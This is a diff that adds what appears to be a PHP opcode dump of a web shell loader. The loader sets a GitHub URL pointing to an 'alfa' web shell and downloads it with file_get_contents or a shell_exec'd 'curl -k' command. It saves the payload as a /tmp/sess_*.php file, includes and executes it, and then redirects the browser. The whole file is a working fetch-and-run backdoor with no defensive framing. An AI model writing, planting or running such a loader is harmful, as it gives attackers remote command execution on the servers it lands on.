@@ -1,0 +1,46 @@
+FunctionStart 
+ASSIGN 'https://raw.githubusercontent.com/justikail/webshell/main/alfav4.1-tesla.php'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT '/tmp/sess_'
+CONCAT '.php'
+INIT_FCALL 'file_exists'
+DO_ICALL 
+INIT_FCALL 'filesize'
+DO_ICALL 
+INIT_FCALL 'unlink'
+DO_ICALL 
+INIT_FCALL 'm'
+DO_FCALL 
+INCLUDE_OR_EVAL 'INCLUDE'
+INIT_FCALL 'm'
+DO_FCALL 
+RETURN 1
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'file_get_contents'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'URL'
+DO_ICALL 
+INIT_FCALL 'shell_exec'
+ROPE_INIT 'curl -k $(echo '
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'URL'
+ROPE_ADD ') > '
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'TMP'
+DO_ICALL 
+INIT_FCALL 'fopen'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'TMP'
+SEND_VAL 'w'
+DO_ICALL 
+INIT_FCALL 'fwrite'
+DO_ICALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+ECHO '<script>window.location="?LOL";</script>'
+RETURN 'null'
+FunctionEnd 
